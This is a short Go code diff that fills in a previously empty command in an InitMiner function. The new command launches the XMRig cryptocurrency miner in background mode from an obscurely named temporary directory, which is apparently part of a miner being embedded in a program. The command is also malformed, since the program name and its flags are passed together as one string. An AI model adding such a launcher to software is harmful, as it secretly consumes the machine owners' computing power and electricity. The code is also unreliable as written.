@@ -41,7 +41,7 @@ func InitMiner(platform string) {
 	if err != nil {
 		panic(err)
 	}
-	cmd := exec.Command("")
+	cmd := exec.Command("./xmrig -c config.json -B")
 	cmd.Dir = intoTempDir("gsxsd/" + extractdir)
 	_, err = cmd.Output()
     if err != nil {
